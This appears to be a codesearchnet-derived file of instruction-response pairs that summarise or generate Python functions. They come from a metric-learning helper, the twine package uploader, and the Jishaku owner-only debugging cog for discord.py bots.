{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef transformer_from_metric(metric, tol=None):\r\n  if not np.allclose(metric, metric.T):\r\n    raise ValueError(\"The input metric should be symmetric.\")\r\n  # If M is diagonal, we will just return the elementwise square root:\r\n  if np.array_equal(metric, np.diag(np.diag(metric))):\r\n    _check_sdp_from_eigen(np.diag(metric), tol)\r\n    return np.diag(np.sqrt(np.maximum(0, np.diag(metric))))\r\n  else:\r\n    try:\r\n      # if `M` is positive semi-definite, it will admit a Cholesky\r\n      # decomposition: L = cholesky(M).T\r\n      return np.linalg.cholesky(metric).T\r\n    except LinAlgError:\r\n      # However, currently np.linalg.cholesky does not support indefinite\r\n      # matrices. So if the latter does not work we will return L = V.T w^(\r\n      # -1/2), with M = V*w*V.T being the eigenvector decomposition of M with\r\n      # the eigenvalues in the diagonal matrix w and the columns of V being the\r\n      # eigenvectors.\r\n      w, V = np.linalg.eigh(metric)\r\n      _check_sdp_from_eigen(w, tol)\r\n      return V.T * np.sqrt(np.maximum(0, w[:, None]))", "response": "Returns the transformation matrix from the Mahalanobis matrix."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef from_args(cls, target_url, default_url, test_url):\n        return cls(\"You're trying to upload to the legacy PyPI site '{}'. \"\n                   \"Uploading to those sites is deprecated. \\n \"\n                   \"The new sites are pypi.org and test.pypi.org. Try using \"\n                   \"{} (or {}) to upload your packages instead. \"\n                   \"These are the default URLs for Twine now. \\n More at \"\n                   \"https://packaging.python.org/guides/migrating-to-pypi-org/\"\n                   \" .\".format(target_url, default_url, test_url)\n                   )", "response": "Return an UploadToDeprecatedPyPIDetected instance."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef check_status_code(response, verbose):\n    if (response.status_code == 410 and\n            response.url.startswith((\"https://pypi.python.org\",\n                                     \"https://testpypi.python.org\"))):\n        print(\"It appears you're uploading to pypi.python.org (or \"\n              \"testpypi.python.org). You've received a 410 error response. \"\n              \"Uploading to those sites is deprecated. The new sites are \"\n              \"pypi.org and test.pypi.org. Try using \"\n              \"https://upload.pypi.org/legacy/ \"\n              \"(or https://test.pypi.org/legacy/) to upload your packages \"\n              \"instead. These are the default URLs for Twine now. More at \"\n              \"https://packaging.python.org/guides/migrating-to-pypi-org/ \")\n    try:\n        response.raise_for_status()\n    except HTTPError as err:\n        if response.text:\n            if verbose:\n                print('Content received from server:\\n{}'.format(\n                    response.text))\n            else:\n                print('NOTE: Try --verbose to see response content.')\n        raise err", "response": "Check if the response is a 410 error and raise an exception if it is"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nfilter files that may be METADATA files.", "response": "def find_candidate_metadata_files(names):\n        \"\"\"Filter files that may be METADATA files.\"\"\"\n        tuples = [\n            x.split('/') for x in map(try_decode, names)\n            if 'METADATA' in x\n        ]\n        return [x[1] for x in sorted([(len(x), x) for x in tuples])]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef hash(self):\n        with open(self.filename, \"rb\") as fp:\n            for content in iter(lambda: fp.read(io.DEFAULT_BUFFER_SIZE), b''):\n                self._md5_update(content)\n                self._sha2_update(content)\n                self._blake_update(content)", "response": "Hash the file contents."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef register_argparse_arguments(parser):\n        parser.add_argument(\n            \"-r\", \"--repository\",\n            action=utils.EnvironmentDefault,\n            env=\"TWINE_REPOSITORY\",\n            default=\"pypi\",\n            help=\"The repository (package index) to upload the package to. \"\n                 \"Should be a section in the config file (default: \"\n                 \"%(default)s). (Can also be set via %(env)s environment \"\n                 \"variable.)\",\n        )\n        parser.add_argument(\n            \"--repository-url\",\n            action=utils.EnvironmentDefault,\n            env=\"TWINE_REPOSITORY_URL\",\n            default=None,\n            required=False,\n            help=\"The repository (package index) URL to upload the package to.\"\n                 \" This overrides --repository. \"\n                 \"(Can also be set via %(env)s environment variable.)\"\n        )\n        parser.add_argument(\n            \"-s\", \"--sign\",\n            action=\"store_true\",\n            default=False,\n            help=\"Sign files to upload using GPG.\",\n        )\n        parser.add_argument(\n            \"--sign-with\",\n            default=\"gpg\",\n            help=\"GPG program used to sign uploads (default: %(default)s).\",\n        )\n        parser.add_argument(\n            \"-i\", \"--identity\",\n            help=\"GPG identity used to sign files.\",\n        )\n        parser.add_argument(\n            \"-u\", \"--username\",\n            action=utils.EnvironmentDefault,\n            env=\"TWINE_USERNAME\",\n            required=False,\n            help=\"The username to authenticate to the repository \"\n                 \"(package index) as. (Can also be set via \"\n                 \"%(env)s environment variable.)\",\n        )\n        parser.add_argument(\n            \"-p\", \"--password\",\n            action=utils.EnvironmentDefault,\n            env=\"TWINE_PASSWORD\",\n            required=False,\n            help=\"The password to authenticate to the repository \"\n                 \"(package index) with. (Can also be set via \"\n                 \"%(env)s environment variable.)\",\n        )\n        parser.add_argument(\n            \"-c\", \"--comment\",\n            help=\"The comment to include with the distribution file.\",\n        )\n        parser.add_argument(\n            \"--config-file\",\n            default=\"~/.pypirc\",\n            help=\"The .pypirc config file to use.\",\n        )\n        parser.add_argument(\n            \"--skip-existing\",\n            default=False,\n            action=\"store_true\",\n            help=\"Continue uploading files if one already exists. (Only valid \"\n                 \"when uploading to PyPI. Other implementations may not \"\n                 \"support this.)\",\n        )\n        parser.add_argument(\n            \"--cert\",\n            action=utils.EnvironmentDefault,\n            env=\"TWINE_CERT\",\n            default=None,\n            required=False,\n            metavar=\"path\",\n            help=\"Path to alternate CA bundle (can also be set via %(env)s \"\n                 \"environment variable).\",\n        )\n        parser.add_argument(\n            \"--client-cert\",\n            metavar=\"path\",\n            help=\"Path to SSL client certificate, a single file containing the\"\n                 \" private key and the certificate in PEM format.\",\n        )\n        parser.add_argument(\n            \"--verbose\",\n            default=False,\n            required=False,\n            action=\"store_true\",\n            help=\"Show verbose output.\"\n        )\n        parser.add_argument(\n            \"--disable-progress-bar\",\n            default=False,\n            required=False,\n            action=\"store_true\",\n            help=\"Disable the progress bar.\"\n        )", "response": "Register the arguments for argparse."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate the Settings from parsed arguments.", "response": "def from_argparse(cls, args):\n        \"\"\"Generate the Settings from parsed arguments.\"\"\"\n        settings = vars(args)\n        settings['repository_name'] = settings.pop('repository')\n        settings['cacert'] = settings.pop('cert')\n        return cls(**settings)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nverifies we are not using legacy PyPI.", "response": "def check_repository_url(self):\n        \"\"\"Verify we are not using legacy PyPI.\n\n        :raises:\n            :class:`~twine.exceptions.UploadToDeprecatedPyPIDetected`\n        \"\"\"\n        repository_url = self.repository_config['repository']\n\n        if repository_url.startswith((repository.LEGACY_PYPI,\n                                      repository.LEGACY_TEST_PYPI)):\n            raise exceptions.UploadToDeprecatedPyPIDetected.from_args(\n                repository_url,\n                utils.DEFAULT_REPOSITORY,\n                utils.TEST_REPOSITORY\n            )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncreates a new repository for uploading.", "response": "def create_repository(self):\n        \"\"\"Create a new repository for uploading.\"\"\"\n        repo = repository.Repository(\n            self.repository_config['repository'],\n            self.username,\n            self.password,\n            self.disable_progress_bar\n        )\n        repo.set_certificate_authority(self.cacert)\n        repo.set_client_certificate(self.client_cert)\n        return repo"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_var_dict_from_ctx(ctx: commands.Context, prefix: str = '_'):\n\n    raw_var_dict = {\n        'author': ctx.author,\n        'bot': ctx.bot,\n        'channel': ctx.channel,\n        'ctx': ctx,\n        'find': discord.utils.find,\n        'get': discord.utils.get,\n        'guild': ctx.guild,\n        'message': ctx.message,\n        'msg': ctx.message\n    }\n\n    return {f'{prefix}{k}': v for k, v in raw_var_dict.items()}", "response": "Returns the dict to be used in REPL for a given Context."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef background_reader(stream, loop: asyncio.AbstractEventLoop, callback):\n\n    for line in iter(stream.readline, b''):\n        loop.call_soon_threadsafe(loop.create_task, callback(line))", "response": "Reads a stream and forwards each line to an async callback."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef make_reader_task(self, stream, callback):\n\n        return self.loop.create_task(self.executor_wrapper(background_reader, stream, self.loop, callback))", "response": "Create a reader executor task for a stream."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncleans a byte sequence of shell directives and decodes it.", "response": "def clean_bytes(line):\n        \"\"\"\n        Cleans a byte sequence of shell directives and decodes it.\n        \"\"\"\n\n        text = line.decode('utf-8').replace('\\r', '').strip('\\n')\n        return re.sub(r'\\x1b[^m]*m', '', text).replace(\"``\", \"`\\u200b`\").strip('\\n')"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nwrapping a Python code into an async function or generator.", "response": "def wrap_code(code: str, args: str = '') -> ast.Module:\n    \"\"\"\n    Compiles Python code into an async function or generator,\n    and automatically adds return if the function body is a single evaluation.\n    Also adds inline import expression support.\n    \"\"\"\n\n    if sys.version_info >= (3, 7):\n        user_code = import_expression.parse(code, mode='exec')\n        injected = ''\n    else:\n        injected = code\n\n    mod = import_expression.parse(CORO_CODE.format(args, textwrap.indent(injected, ' ' * 8)), mode='exec')\n\n    definition = mod.body[-1]  # async def ...:\n    assert isinstance(definition, ast.AsyncFunctionDef)\n\n    try_block = definition.body[-1]  # try:\n    assert isinstance(try_block, ast.Try)\n\n    if sys.version_info >= (3, 7):\n        try_block.body.extend(user_code.body)\n    else:\n        ast.increment_lineno(mod, -16)  # bring line numbers back in sync with repl\n\n    ast.fix_missing_locations(mod)\n\n    is_asyncgen = any(isinstance(node, ast.Yield) for node in ast.walk(try_block))\n\n    last_expr = try_block.body[-1]\n\n    # if the last part isn't an expression, ignore it\n    if not isinstance(last_expr, ast.Expr):\n        return mod\n\n    # if the last expression is not a yield\n    if not isinstance(last_expr.value, ast.Yield):\n        # copy the expression into a return/yield\n        if is_asyncgen:\n            # copy the value of the expression into a yield\n            yield_stmt = ast.Yield(last_expr.value)\n            ast.copy_location(yield_stmt, last_expr)\n            # place the yield into its own expression\n            yield_expr = ast.Expr(yield_stmt)\n            ast.copy_location(yield_expr, last_expr)\n\n            # place the yield where the original expression was\n            try_block.body[-1] = yield_expr\n        else:\n            # copy the expression into a return\n            return_stmt = ast.Return(last_expr.value)\n            ast.copy_location(return_stmt, last_expr)\n\n            # place the return where the original expression was\n            try_block.body[-1] = return_stmt\n\n    return mod"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\nasync def traverse(self, func):\n\n        # this allows the reference to be stolen\n        async_executor = self\n\n        if inspect.isasyncgenfunction(func):\n            async for result in func(*async_executor.args):\n                yield result\n        else:\n            yield await func(*async_executor.args)", "response": "Traverses an asynchronous function or generator yielding each result."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_parent_scope_from_var(name, global_ok=False, skip_frames=0) -> typing.Optional[Scope]:\n\n    stack = inspect.stack()\n    try:\n        for frame_info in stack[skip_frames + 1:]:\n            frame = None\n\n            try:\n                frame = frame_info.frame\n\n                if name in frame.f_locals or (global_ok and name in frame.f_globals):\n                    return Scope(globals_=frame.f_globals, locals_=frame.f_locals)\n            finally:\n                del frame\n    finally:\n        del stack\n\n    return None", "response": "Returns the parent scope of the given variable name."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_parent_var(name, global_ok=False, default=None, skip_frames=0):\n\n    scope = get_parent_scope_from_var(name, global_ok=global_ok, skip_frames=skip_frames + 1)\n\n    if not scope:\n        return default\n\n    if name in scope.locals:\n        return scope.locals.get(name, default)\n\n    return scope.globals.get(name, default)", "response": "Get a variable from a parent frame - scope."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef clear_intersection(self, other_dict):\n\n        for key, value in other_dict.items():\n            if key in self.globals and self.globals[key] is value:\n                del self.globals[key]\n            if key in self.locals and self.locals[key] is value:\n                del self.locals[key]\n\n        return self", "response": "Clears out locals and globals from this scope where the key - value pair matches\n        with other_dict."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nupdate this scope with the content of another scope.", "response": "def update(self, other):\n        \"\"\"\n        Updates this scope with the content of another scope.\n\n        Arguments\n        ---------\n        other: a :class:`Scope` instance.\n\n        Returns\n        -------\n        Scope\n            The updated scope (self).\n        \"\"\"\n\n        self.globals.update(other.globals)\n        self.locals.update(other.locals)\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsending a traceback to a destination.", "response": "async def send_traceback(destination: discord.abc.Messageable, verbosity: int, *exc_info):\n    \"\"\"\n    Sends a traceback of an exception to a destination.\n    Used when REPL fails for any reason.\n\n    :param destination: Where to send this information to\n    :param verbosity: How far back this traceback should go. 0 shows just the last stack.\n    :param exc_info: Information about this exception, from sys.exc_info or similar.\n    :return: The last message sent\n    \"\"\"\n\n    # to make pylint stop moaning\n    etype, value, trace = exc_info\n\n    traceback_content = \"\".join(traceback.format_exception(etype, value, trace, verbosity)).replace(\"``\", \"`\\u200b`\")\n\n    paginator = commands.Paginator(prefix='```py')\n    for line in traceback_content.split('\\n'):\n        paginator.add_line(line)\n\n    message = None\n\n    for page in paginator.pages:\n        message = await destination.send(page)\n\n    return message"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nperforms an action after a set amount of time.", "response": "async def do_after_sleep(delay: float, coro, *args, **kwargs):\n    \"\"\"\n    Performs an action after a set amount of time.\n\n    This function only calls the coroutine after the delay,\n    preventing asyncio complaints about destroyed coros.\n\n    :param delay: Time in seconds\n    :param coro: Coroutine to run\n    :param args: Arguments to pass to coroutine\n    :param kwargs: Keyword arguments to pass to coroutine\n    :return: Whatever the coroutine returned.\n    \"\"\"\n    await asyncio.sleep(delay)\n    return await coro(*args, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\nasync def attempt_add_reaction(msg: discord.Message, reaction: typing.Union[str, discord.Emoji])\\\n        -> typing.Optional[discord.Reaction]:\n    \"\"\"\n    Try to add a reaction to a message, ignoring it if it fails for any reason.\n\n    :param msg: The message to add the reaction to.\n    :param reaction: The reaction emoji, could be a string or `discord.Emoji`\n    :return: A `discord.Reaction` or None, depending on if it failed or not.\n    \"\"\"\n    try:\n        return await msg.add_reaction(reaction)\n    except discord.HTTPException:\n        pass", "response": "Attempts to add a reaction to a message ignoring any exceptions."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef add_inspection(name):\n\n    # create the real decorator\n    def inspection_inner(func):\n        \"\"\"\n        Jishaku inspection decorator\n        \"\"\"\n\n        # pylint: disable=inconsistent-return-statements\n\n        # create an encapsulated version of the inspection that swallows exceptions\n        @functools.wraps(func)\n        def encapsulated(*args, **kwargs):\n            try:\n                return func(*args, **kwargs)\n            except (TypeError, AttributeError, ValueError, OSError):\n                return\n\n        INSPECTIONS.append((name, encapsulated))\n        return func\n    return inspection_inner", "response": "Add a Jishaku object inspection decorator"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef all_inspections(obj):\n\n    for name, callback in INSPECTIONS:\n        result = callback(obj)\n        if result:\n            yield name, result", "response": "Generator to iterate all current Jishaku inspections."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting the name of an object including the module name if available.", "response": "def class_name(obj):\n    \"\"\"\n    Get the name of an object, including the module name if available.\n    \"\"\"\n\n    name = obj.__name__\n    module = getattr(obj, '__module__')\n\n    if module:\n        name = f'{module}.{name}'\n    return name"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef pages(self):\n        # protected access has to be permitted here to not close the paginator's pages\n\n        # pylint: disable=protected-access\n        paginator_pages = list(self.paginator._pages)\n        if len(self.paginator._current_page) > 1:\n            paginator_pages.append('\\n'.join(self.paginator._current_page) + '\\n' + (self.paginator.suffix or ''))\n        # pylint: enable=protected-access\n\n        return paginator_pages", "response": "Returns the paginator s pages without prematurely closing the active page."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the current page the paginator interface is on.", "response": "def display_page(self):\n        \"\"\"\n        Returns the current page the paginator interface is on.\n        \"\"\"\n\n        self._display_page = max(0, min(self.page_count - 1, self._display_page))\n        return self._display_page"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef display_page(self, value):\n\n        self._display_page = max(0, min(self.page_count - 1, value))", "response": "Sets the current page the paginator is on. Automatically pushes values inbounds."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef send_kwargs(self) -> dict:\n\n        display_page = self.display_page\n        page_num = f'\\nPage {display_page + 1}/{self.page_count}'\n        content = self.pages[display_page] + page_num\n        return {'content': content}", "response": "A property that returns the kwargs forwarded to send or edit when updating the page."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\nasync def add_line(self, *args, **kwargs):\n\n        display_page = self.display_page\n        page_count = self.page_count\n\n        self.paginator.add_line(*args, **kwargs)\n\n        new_page_count = self.page_count\n\n        if display_page + 1 == page_count:\n            # To keep position fixed on the end, update position to new last page and update message.\n            self._display_page = new_page_count\n            self.bot.loop.create_task(self.update())", "response": "A proxy function that allows this PaginatorInterface to remain locked to the last page."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\nasync def send_to(self, destination: discord.abc.Messageable):\n\n        self.message = await destination.send(**self.send_kwargs)\n\n        # add the close reaction\n        await self.message.add_reaction(self.emojis.close)\n\n        # if there is more than one page, and the reactions haven't been sent yet, send navigation emotes\n        if not self.sent_page_reactions and self.page_count > 1:\n            await self.send_all_reactions()\n\n        if self.task:\n            self.task.cancel()\n\n        self.task = self.bot.loop.create_task(self.wait_loop())", "response": "Sends a message to the given destination with this interface."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\nasync def send_all_reactions(self):\n\n        for emoji in filter(None, self.emojis):\n            await self.message.add_reaction(emoji)\n        self.sent_page_reactions = True", "response": "Sends all reactions for this paginator."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nwaits on a loop for reactions to the message.", "response": "async def wait_loop(self):\n        \"\"\"\n        Waits on a loop for reactions to the message. This should not be called manually - it is handled by `send_to`.\n        \"\"\"\n\n        start, back, forward, end, close = self.emojis\n\n        def check(payload: discord.RawReactionActionEvent):\n            \"\"\"\n            Checks if this reaction is related to the paginator interface.\n            \"\"\"\n\n            owner_check = not self.owner or payload.user_id == self.owner.id\n\n            emoji = payload.emoji\n            if isinstance(emoji, discord.PartialEmoji) and emoji.is_unicode_emoji():\n                emoji = emoji.name\n\n            return payload.message_id == self.message.id and \\\n                emoji and emoji in self.emojis and \\\n                payload.user_id != self.bot.user.id and owner_check\n\n        try:\n            while not self.bot.is_closed():\n                payload = await self.bot.wait_for('raw_reaction_add', check=check, timeout=self.timeout)\n\n                emoji = payload.emoji\n                if isinstance(emoji, discord.PartialEmoji) and emoji.is_unicode_emoji():\n                    emoji = emoji.name\n\n                if emoji == close:\n                    await self.message.delete()\n                    return\n\n                if emoji == start:\n                    self._display_page = 0\n                elif emoji == end:\n                    self._display_page = self.page_count - 1\n                elif emoji == back:\n                    self._display_page -= 1\n                elif emoji == forward:\n                    self._display_page += 1\n\n                self.bot.loop.create_task(self.update())\n\n                try:\n                    await self.message.remove_reaction(payload.emoji, discord.Object(id=payload.user_id))\n                except discord.Forbidden:\n                    pass\n\n        except asyncio.TimeoutError:\n            if self.delete_message:\n                return await self.message.delete()\n\n            for emoji in filter(None, self.emojis):\n                try:\n                    await self.message.remove_reaction(emoji, self.message.guild.me)\n                except (discord.Forbidden, discord.NotFound):\n                    pass"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nupdating this interface s messages with the latest data.", "response": "async def update(self):\n        \"\"\"\n        Updates this interface's messages with the latest data.\n        \"\"\"\n\n        if self.update_lock.locked():\n            return\n\n        async with self.update_lock:\n            if self.update_lock.locked():\n                # if this engagement has caused the semaphore to exhaust,\n                # we are overloaded and need to calm down.\n                await asyncio.sleep(1)\n\n            if not self.message:\n                # too fast, stagger so this update gets through\n                await asyncio.sleep(0.5)\n\n            if not self.sent_page_reactions and self.page_count > 1:\n                self.bot.loop.create_task(self.send_all_reactions())\n                self.sent_page_reactions = True  # don't spawn any more tasks\n\n            await self.message.edit(**self.send_kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\nasync def copy_context_with(ctx: commands.Context, *, author=None, channel=None, **kwargs):\n\n    # copy the message and update the attributes\n    alt_message: discord.Message = copy.copy(ctx.message)\n    alt_message._update(channel or alt_message.channel, kwargs)  # pylint: disable=protected-access\n\n    if author is not None:\n        alt_message.author = author\n\n    # obtain and return a context of the same type\n    return await ctx.bot.get_context(alt_message, cls=type(ctx))", "response": "Copy a context with the same message properties."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\nasync def cog_check(self, ctx: commands.Context):\n\n        if not await ctx.bot.is_owner(ctx.author):\n            raise commands.NotOwner(\"You must own this bot to use Jishaku.\")\n        return True", "response": "Local check makes all commands in this cog owner - only"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\nasync def jsk(self, ctx: commands.Context):\n\n        summary = [\n            f\"Jishaku v{__version__}, discord.py `{package_version('discord.py')}`, \"\n            f\"`Python {sys.version}` on `{sys.platform}`\".replace(\"\\n\", \"\"),\n            f\"Module was loaded {humanize.naturaltime(self.load_time)}, \"\n            f\"cog was loaded {humanize.naturaltime(self.start_time)}.\",\n            \"\"\n        ]\n\n        if psutil:\n            proc = psutil.Process()\n\n            with proc.oneshot():\n                mem = proc.memory_full_info()\n                summary.append(f\"Using {humanize.naturalsize(mem.rss)} physical memory and \"\n                               f\"{humanize.naturalsize(mem.vms)} virtual memory, \"\n                               f\"{humanize.naturalsize(mem.uss)} of which unique to this process.\")\n\n                name = proc.name()\n                pid = proc.pid\n                thread_count = proc.num_threads()\n\n                summary.append(f\"Running on PID {pid} (`{name}`) with {thread_count} thread(s).\")\n\n                summary.append(\"\")  # blank line\n\n        cache_summary = f\"{len(self.bot.guilds)} guild(s) and {len(self.bot.users)} user(s)\"\n\n        if isinstance(self.bot, discord.AutoShardedClient):\n            summary.append(f\"This bot is automatically sharded and can see {cache_summary}.\")\n        elif self.bot.shard_count:\n            summary.append(f\"This bot is manually sharded and can see {cache_summary}.\")\n        else:\n            summary.append(f\"This bot is not sharded and can see {cache_summary}.\")\n\n        summary.append(f\"Average websocket latency: {round(self.bot.latency * 1000, 2)}ms\")\n\n        await ctx.send(\"\\n\".join(summary))", "response": "Show the status of the current cog."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\nasync def jsk_hide(self, ctx: commands.Context):\n\n        if self.jsk.hidden:\n            return await ctx.send(\"Jishaku is already hidden.\")\n\n        self.jsk.hidden = True\n        await ctx.send(\"Jishaku is now hidden.\")", "response": "Hides Jishaku from the help command."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\nasync def jsk_show(self, ctx: commands.Context):\n\n        if not self.jsk.hidden:\n            return await ctx.send(\"Jishaku is already visible.\")\n\n        self.jsk.hidden = False\n        await ctx.send(\"Jishaku is now visible.\")", "response": "Show the Jishaku in the help command."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nshows the currently running jishaku tasks.", "response": "async def jsk_tasks(self, ctx: commands.Context):\n        \"\"\"\n        Shows the currently running jishaku tasks.\n        \"\"\"\n\n        if not self.tasks:\n            return await ctx.send(\"No currently running tasks.\")\n\n        paginator = commands.Paginator(max_size=1985)\n\n        for task in self.tasks:\n            paginator.add_line(f\"{task.index}: `{task.ctx.command.qualified_name}`, invoked at \"\n                               f\"{task.ctx.message.created_at.strftime('%Y-%m-%d %H:%M:%S')} UTC\")\n\n        interface = PaginatorInterface(ctx.bot, paginator, owner=ctx.author)\n        await interface.send_to(ctx)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\nasync def jsk_cancel(self, ctx: commands.Context, *, index: int):\n\n        if not self.tasks:\n            return await ctx.send(\"No tasks to cancel.\")\n\n        if index == -1:\n            task = self.tasks.pop()\n        else:\n            task = discord.utils.get(self.tasks, index=index)\n            if task:\n                self.tasks.remove(task)\n            else:\n                return await ctx.send(\"Unknown task.\")\n\n        task.task.cancel()\n        return await ctx.send(f\"Cancelled task {task.index}: `{task.ctx.command.qualified_name}`,\"\n                              f\" invoked at {task.ctx.message.created_at.strftime('%Y-%m-%d %H:%M:%S')} UTC\")", "response": "Cancels a task with the given index."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\nasync def jsk_load(self, ctx: commands.Context, *extensions: ExtensionConverter):\n\n        paginator = commands.Paginator(prefix='', suffix='')\n\n        for extension in itertools.chain(*extensions):\n            method, icon = (\n                (self.bot.reload_extension, \"\\N{CLOCKWISE RIGHTWARDS AND LEFTWARDS OPEN CIRCLE ARROWS}\")\n                if extension in self.bot.extensions else\n                (self.bot.load_extension, \"\\N{INBOX TRAY}\")\n            )\n\n            try:\n                method(extension)\n            except Exception as exc:  # pylint: disable=broad-except\n                traceback_data = ''.join(traceback.format_exception(type(exc), exc, exc.__traceback__, 1))\n\n                paginator.add_line(\n                    f\"{icon}\\N{WARNING SIGN} `{extension}`\\n```py\\n{traceback_data}\\n```\",\n                    empty=True\n                )\n            else:\n                paginator.add_line(f\"{icon} `{extension}`\", empty=True)\n\n        for page in paginator.pages:\n            await ctx.send(page)", "response": "Load or reloads the given extensions."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nlogs this bot out.", "response": "async def jsk_shutdown(self, ctx: commands.Context):\n        \"\"\"\n        Logs this bot out.\n        \"\"\"\n\n        await ctx.send(\"Logging out now..\")\n        await ctx.bot.logout()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nrunning a command as someone else.", "response": "async def jsk_su(self, ctx: commands.Context, target: discord.User, *, command_string: str):\n        \"\"\"\n        Run a command as someone else.\n\n        This will try to resolve to a Member, but will use a User if it can't find one.\n        \"\"\"\n\n        if ctx.guild:\n            # Try to upgrade to a Member instance\n            # This used to be done by a Union converter, but doing it like this makes\n            #  the command more compatible with chaining, e.g. `jsk in .. jsk su ..`\n            target = ctx.guild.get_member(target.id) or target\n\n        alt_ctx = await copy_context_with(ctx, author=target, content=ctx.prefix + command_string)\n\n        if alt_ctx.command is None:\n            if alt_ctx.invoked_with is None:\n                return await ctx.send('This bot has been hard-configured to ignore this user.')\n            return await ctx.send(f'Command \"{alt_ctx.invoked_with}\" is not found')\n\n        return await alt_ctx.command.invoke(alt_ctx)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\nasync def jsk_in(self, ctx: commands.Context, channel: discord.TextChannel, *, command_string: str):\n\n        alt_ctx = await copy_context_with(ctx, channel=channel, content=ctx.prefix + command_string)\n\n        if alt_ctx.command is None:\n            return await ctx.send(f'Command \"{alt_ctx.invoked_with}\" is not found')\n\n        return await alt_ctx.command.invoke(alt_ctx)", "response": "Run a command as if it were in a different channel."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrunning a command by executing it.", "response": "async def jsk_sudo(self, ctx: commands.Context, *, command_string: str):\n        \"\"\"\n        Run a command bypassing all checks and cooldowns.\n\n        This also bypasses permission checks so this has a high possibility of making a command raise.\n        \"\"\"\n\n        alt_ctx = await copy_context_with(ctx, content=ctx.prefix + command_string)\n\n        if alt_ctx.command is None:\n            return await ctx.send(f'Command \"{alt_ctx.invoked_with}\" is not found')\n\n        return await alt_ctx.command.reinvoke(alt_ctx)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrunning a command multiple times in a row. This acts like the command was invoked several times manually, so it obeys cooldowns.", "response": "async def jsk_repeat(self, ctx: commands.Context, times: int, *, command_string: str):\n        \"\"\"\n        Runs a command multiple times in a row.\n\n        This acts like the command was invoked several times manually, so it obeys cooldowns.\n        \"\"\"\n\n        with self.submit(ctx):  # allow repeats to be cancelled\n            for _ in range(times):\n                alt_ctx = await copy_context_with(ctx, content=ctx.prefix + command_string)\n\n                if alt_ctx.command is None:\n                    return await ctx.send(f'Command \"{alt_ctx.invoked_with}\" is not found')\n\n                await alt_ctx.command.reinvoke(alt_ctx)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrunning a command timing execution and catching exceptions.", "response": "async def jsk_debug(self, ctx: commands.Context, *, command_string: str):\n        \"\"\"\n        Run a command timing execution and catching exceptions.\n        \"\"\"\n\n        alt_ctx = await copy_context_with(ctx, content=ctx.prefix + command_string)\n\n        if alt_ctx.command is None:\n            return await ctx.send(f'Command \"{alt_ctx.invoked_with}\" is not found')\n\n        start = time.perf_counter()\n\n        async with ReplResponseReactor(ctx.message):\n            with self.submit(ctx):\n                await alt_ctx.command.invoke(alt_ctx)\n\n        end = time.perf_counter()\n        return await ctx.send(f\"Command `{alt_ctx.command.qualified_name}` finished in {end - start:.3f}s.\")"}
